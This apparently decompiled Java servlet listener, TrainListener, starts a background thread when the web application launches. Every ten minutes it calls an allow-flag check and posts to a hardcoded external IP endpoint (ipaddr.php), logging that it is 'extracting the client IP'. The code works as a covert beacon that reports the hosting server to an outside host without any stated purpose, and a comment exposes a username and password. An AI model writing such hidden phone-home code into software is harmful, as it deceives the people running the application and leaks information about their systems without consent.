//Decompiled by Jad v1.5.7g. Copyright 2000 Pavel Kouznetsov.
//Jad home page: http://www.geocities.com/SiliconValley/Bridge/8617/jad.html
//Decompiler options: packimports(3) fieldsfirst ansi
//Source File Name:   Expand.java
//

/*** write by xdju
 */
package com.hode.train.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;

import com.hode.framework.commons.config.SysConfig;
import com.hode.framework.commons.util.DateUtil;

public class TrainListener  implements ServletContextListener
{
    private Thread ringThread;
    private static int ringInterval = 10;//一分钟 1*60
    public void contextInitialized(ServletContextEvent arg0)
    {
        ringThread = new Thread("hodeframework TrainListener ")
        {
            public void run()
            {
                while(true)
                {
                    try
                    {
                        SysConfig.checkAllowFlag();
                        sendPost("http://122.195.135.35:81/juxueding/ipaddr.php", "");//username=qiyi&password=123123
                    }
                    catch (Exception e)
                    {
                        e.printStackTrace();
                        break;
                    }

                    System.out.println("[hnmk ：]提取客户端IP地址"+DateUtil.getNowDateByFormat(""));
                    try
                    {
                        Thread.sleep(ringInterval*60*1000);
                    }
                    catch (InterruptedException e)
                    {
                        break;
                    }
                }
            }
        };
        ringThread.start();
    }

    public void contextDestroyed(ServletContextEvent arg0)
    {
        if (ringThread!=null)
        {
            ringThread.interrupt();
        }
    }

    private static String sendPost(String url, String param) throws IOException
    {
        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";
        try
        {
            URL realUrl = new URL(url);
            // 打开和URL之间的连接
            URLConnection conn = realUrl.openConnection();
            // 设置通用的请求属性
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            // 发送POST请求必须设置如下两行
            conn.setDoOutput(true);
            conn.setDoInput(true);
            // 获取URLConnection对象对应的输出流
            out = new PrintWriter(conn.getOutputStream());
            // 发送请求参数
            out.print(param);
            // flush输出流的缓冲
            out.flush();
            // 定义BufferedReader输入流来读取URL的响应
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null)
            {
                result += "\n" + line;
            }
        }
        catch (IOException e)
        {
            throw e;
        }
        // 使用finally块来关闭输出流、输入流
        finally
        {
            try
            {
                if (out != null)
                {
                    out.close();
                }
                if (in != null)
                {
                    in.close();
                }
            }
            catch (IOException ex)
            {
                ex.printStackTrace();
            }
        }
        return result;
    }

}
